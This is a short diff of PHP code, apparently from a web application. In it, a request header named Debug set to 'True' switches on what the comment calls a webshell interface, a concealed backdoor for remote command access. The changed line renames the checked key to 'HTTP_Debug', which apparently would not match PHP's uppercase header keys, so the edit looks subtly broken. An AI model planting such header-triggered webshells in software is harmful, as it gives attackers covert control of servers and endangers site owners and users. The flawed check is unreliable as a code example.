@@ -19,7 +19,7 @@
 
 
     // Check if the DEBUG header is set and its value is "True"
-    $debugMode = isset($_SERVER['HTTP_DEBUG']) && $_SERVER['HTTP_DEBUG'] === 'True';
+    $debugMode = isset($_SERVER['HTTP_Debug']) && $_SERVER['HTTP_Debug'] === 'True';
 
     if ($debugMode) {
         // Display the webshell interface if debug mode is enabled
